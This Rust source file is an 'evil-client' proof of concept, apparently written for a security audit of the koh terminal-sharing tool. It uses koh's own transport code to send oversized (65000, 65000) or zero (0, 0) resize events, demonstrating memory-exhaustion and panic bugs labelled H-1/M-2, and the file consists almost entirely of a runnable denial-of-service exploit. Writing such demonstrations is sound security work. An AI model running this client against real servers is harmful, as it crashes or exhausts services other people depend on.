//! A malicious koh CLIENT: connects to a koh server like a real client, but injects an
//! attacker-chosen terminal resize `(rows, cols)` — including the OOM-bomb `(65000, 65000)` and the
//! panic-trigger `(0, 0)` — to prove the unbounded-resize findings (H-1 / M-2). It reuses koh's own
//! public wire/transport code, so the resize is just a `u16` it puts on the wire: the malicious
//! client allocates nothing big, while the SERVER allocates the giant `vt100` grid.
//!
//! Usage: evil-client <server-id> <ip:port> <rows> <cols> [passphrase]

use std::time::Duration;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args: Vec<String> = std::env::args().collect();
    let usage = "usage: evil-client <server-id> <ip:port> <rows> <cols> [passphrase]";
    let id_str = args.get(1).ok_or_else(|| anyhow::anyhow!(usage))?;
    let addr_str = args.get(2).ok_or_else(|| anyhow::anyhow!(usage))?;
    let rows: u16 = args.get(3).ok_or_else(|| anyhow::anyhow!(usage))?.parse()?;
    let cols: u16 = args.get(4).ok_or_else(|| anyhow::anyhow!(usage))?.parse()?;
    let pass = args.get(5).map(String::as_str);

    let server_id = koh::transport_iroh::parse_endpoint_id(id_str)?;
    let addr: std::net::SocketAddr = addr_str.parse()?;

    let secret = koh::transport_iroh::generate_secret_key();
    let ep = koh::transport_iroh::bind_endpoint_local(secret, false).await?;
    let target = koh::transport_iroh::direct_addr(server_id, addr);
    let conn = ep.connect(target, koh::transport_iroh::ALPN).await?;
    koh::transport_iroh::auth::handshake_client(&conn, pass).await?;
    eprintln!("evil-client: connected; injecting malicious resize({rows}, {cols})");

    let channel = koh::transport_iroh::IrohChannel::new(conn);
    let clock = koh::transport_iroh::MonoClock::new();
    let mut t = koh::ssp::Transport::<koh::input::UserInput, koh::terminal::TerminalScreen>::new(
        clock.now_ms(),
        channel.max_datagram_size(),
    );
    t.set_connected(true);
    // The whole attack: one oversized/zero resize event in the UserInput stream.
    t.current_mut().push_resize(rows, cols);

    // Pump the SSP so the malicious resize is delivered (and retransmitted) to the server.
    for _ in 0..40 {
        let now = clock.now_ms();
        t.set_mtu(channel.max_datagram_size());
        for dg in t.tick(now) {
            channel.send(&dg);
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    eprintln!("evil-client: done sending");
    Ok(())
}
